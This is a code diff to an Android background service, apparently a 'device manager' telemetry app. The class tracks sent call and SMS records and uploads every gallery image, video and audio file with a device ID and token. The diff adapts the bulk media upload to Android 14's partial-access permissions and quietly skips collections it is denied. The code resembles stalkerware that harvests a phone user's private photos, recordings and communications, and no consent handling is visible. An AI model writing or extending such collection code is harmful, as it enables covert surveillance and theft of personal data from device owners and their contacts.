@@ -62,9 +62,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String CHANNEL_ID = "devicemgr_channel";
     private static final String PREFS = "devicemgr_prefs";
     private static final int ANDROID_13_API_LEVEL = 33;
+    private static final int ANDROID_14_API_LEVEL = 34;
     private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
+    private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
     private static final String KEY_PENDING_EVENTS = "pending_events_queue";
     private static final String KEY_SENT_CALL_KEYS = "sent_call_keys";
     private static final String KEY_SENT_SMS_KEYS = "sent_sms_keys";
@@ -184,8 +186,43 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private boolean canReadMedia() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasImageAccess() || hasVideoAccess() || hasAudioAccess();
+        }
         if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
             return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasPermission(READ_MEDIA_AUDIO_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
+    private boolean hasVisualUserSelectedAccess() {
+        return Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL
+                && hasPermission(READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION);
+    }
+
+    private boolean hasImageAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasVisualUserSelectedAccess();
+        }
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_IMAGES_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
+    private boolean hasVideoAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasVisualUserSelectedAccess();
+        }
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_VIDEO_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
+    private boolean hasAudioAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_AUDIO_PERMISSION);
         }
         return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
     }
@@ -1102,12 +1139,73 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     MediaStore.MediaColumns.DATE_ADDED
             };
 
-            uploadMediaCursor(cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), true, "gallery_image", cr, uploaded, uploadedObj, sp, deviceId, token);
-            uploadMediaCursor(cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_video", cr, uploaded, uploadedObj, sp, deviceId, token);
-            uploadMediaCursor(cr.query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_audio", cr, uploaded, uploadedObj, sp, deviceId, token);
+            if (hasImageAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        true,
+                        "gallery_image",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
+
+            if (hasVideoAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        false,
+                        "gallery_video",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
+
+            if (hasAudioAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        false,
+                        "gallery_audio",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
 
         } catch (Exception e) {
             Log.e(TAG, "uploadAllMediaOnce err", e);
+        }
+    }
+
+    private void scanMediaCollection(ContentResolver cr, Uri collectionUri, String[] projection, boolean image, String origin, Set<String> uploaded, JSONObject uploadedObj, SharedPreferences sp, String deviceId, String token) {
+        try {
+            uploadMediaCursor(
+                    cr.query(collectionUri, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"),
+                    image,
+                    origin,
+                    cr,
+                    uploaded,
+                    uploadedObj,
+                    sp,
+                    deviceId,
+                    token
+            );
+        } catch (SecurityException e) {
+            Log.w(TAG, "no permission for " + origin, e);
+        } catch (Exception e) {
+            Log.e(TAG, "scan media err " + origin, e);
         }
     }
 
